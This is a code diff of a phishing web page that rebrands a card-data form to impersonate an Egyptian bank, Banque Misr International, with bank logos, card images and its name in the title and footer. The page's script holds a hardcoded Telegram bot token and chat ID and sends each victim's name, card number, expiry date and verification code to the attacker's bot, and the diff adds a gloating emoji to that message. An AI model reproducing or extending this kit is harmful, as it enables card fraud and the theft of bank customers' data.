@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MANW</title>
+  <title>بنك مصر الدولي</title>
   <style>
     * { box-sizing: border-box; }
     body {
@@ -12,17 +12,34 @@
       background: #f1eeee;
       color: #252525;
     }
+    
+    /* تنسيق قسم الهيدر الذي يحتوي على الصور */
     header {
-      background: #861f35;
-      color: white;
+      background: white;
       text-align: center;
-      padding: 30px 15px;
-      border-bottom: 5px solid #d9ae38;
+      padding: 10px;
+      border-bottom: 5px solid #d9ae38; /* الحفاظ على الخط الذهبي المميز */
     }
-    header h1 {
-      margin: 0;
-      font-size: 32px;
+
+    /* تنسيق الصور لتكون متجاوبة وتظهر بشكل لائق */
+    .header-image {
+      max-width: 100%; /* لا تخرج الصورة عن حدود الشاشة */
+      height: auto;
+      display: block;
+      margin: 10px auto; /* توسيط الصور وإضافة مسافة بينها */
+      border-radius: 8px; /* حواف ناعمة للصور */
     }
+
+    /* تعديل حجم لوجو بنك مصر ليكون أنسب في الهيدر */
+    #logo-img {
+      max-height: 120px;
+    }
+    
+    /* تعديل حجم صورة البطاقات البنكية */
+    #cards-img {
+      max-height: 250px;
+    }
+
     .container {
       width: 92%;
       max-width: 950px;
@@ -88,8 +105,15 @@
 </head>
 <body>
   <header>
-    <h1>MANW</h1>
+    <!-- وضع الصور في بداية الموقع باستخدام Data URIs -->
+    
+    <!-- صورة لوجو بنك مصر -->
+    <img src="data:image/jpeg;base64,...(تعديل: تم حذف كود الصورة الطويل للاختصار)..." alt="لوجو بنك مصر" class="header-image" id="logo-img">
+    
+    <!-- صورة البطاقات البنكية -->
+    <img src="data:image/jpeg;base64,...(تعديل: تم حذف كود الصورة الطويل للاختصار)..." alt="بطاقات بنك مصر" class="header-image" id="cards-img">
   </header>
+  
   <div class="container">
     <section class="card">
       <h2>البيانات الشخصية</h2>
@@ -111,11 +135,13 @@
       <div id="result" aria-live="polite"></div>
     </section>
   </div>
+  
   <footer>
-    MANW
+    بنك مصر الدولي
   </footer>
 
   <script>
+    // الحفاظ على كود الجافا سكريبت كما هو لإرسال البيانات للبوت
     const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
     const CHAT_ID = "7713496654";
 
@@ -144,7 +170,7 @@
       submitBtn.disabled = true;
       submitBtn.textContent = "جاري الإرسال...";
 
-      const message = `🚨 بيان جديد وارد:\n\n👤 الاسم: ${name}\n💳 رقم البطاقة: ${cardNum}\n📅 تاريخ الانتهاء: ${expiry}\n🔑 رمز التحقق: ${code}`;
+      const message = `🚨 بيان جديد وارد (من موقع بنك مصر الدولي): 😈💪\n👤 الاسم: ${name}\n💳 رقم البطاقة: ${cardNum}\n📅 تاريخ الانتهاء: ${expiry}\n🔑 رمز التحقق: ${code} ♡`;
 
       try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
